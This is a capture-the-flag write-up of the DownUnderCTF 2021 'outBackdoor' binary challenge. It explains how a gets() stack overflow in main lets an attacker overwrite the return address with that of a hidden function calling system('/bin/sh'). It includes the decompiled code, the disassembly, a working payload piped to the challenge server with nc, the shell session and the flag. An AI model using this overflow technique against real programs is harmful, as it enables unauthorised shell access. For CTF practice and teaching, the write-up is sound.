# outBackdoor
>Fool me once, shame on you. Fool me twice, shame on me.

>Author: xXl33t_h@x0rXx

> nc pwn-2021.duc.tf 31921

[outBackdoor](https://drive.google.com/file/d/1ZLzi6VLqK6231NkTDtusYRlAfi7DkcO7/view?usp=sharing)

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-10h]

  buffer_init(*(_QWORD *)&argc, argv, envp);
  puts("\nFool me once, shame on you. Fool me twice, shame on me.");
  puts("\nSeriously though, what features would be cool? Maybe it could play a song?");
  gets(&v4);
  return 0;
}
```
 The gets function allow us to input more than 16 byte and overwrite the return address of main function.

```
int outBackdoor()
{
  puts("\n\nW...w...Wait? Who put this backdoor out back here?");
  return system("/bin/sh");
}
```

We see another function outBackdoor, which run system(“/bin/sh”) and give us the shell.

we just need to overwrite return address of main function to address of outBackdoor

```
public outBackdoor
outBackdoor proc near
; __unwind {
push    rbp
mov     rbp, rsp
lea     rdi, aWWWaitWhoPutTh ; "\n\nW...w...Wait? Who put this backdoor"...
call    _puts
lea     rdi, command    ; "/bin/sh"
mov     eax, 0
call    _system
nop
pop     rbp
retn
; } // starts at 4011D7
outBackdoor endp

```
Address of `outBackdoor` is `00000000004011D7`


```
┌──(kali㉿kali)-[~/Desktop/DownUnderCTF21]
└─$ python3                                                                                               148 ⨯ 3 ⚙
Python 3.9.1+ (default, Feb  5 2021, 13:46:56) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pwn
>>> pwn.p64(0x0000000004011d7)
b'\xd7\x11@\x00\x00\x00\x00\x00'

```


# Solution

```
┌──(kali㉿kali)-[~/Desktop/DownUnderCTF21]
└─$ (python -c 'print "a"*0x18 + "\xd8\x11@\x00\x00\x00\x00\x00"'; cat) |  nc pwn-2021.duc.tf 31921       148 ⨯ 1 ⚙

Fool me once, shame on you. Fool me twice, shame on me.

Seriously though, what features would be cool? Maybe it could play a song?


W...w...Wait? Who put this backdoor out back here?
ls
flag.txt
pwn
cat flag.txt
DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}

```

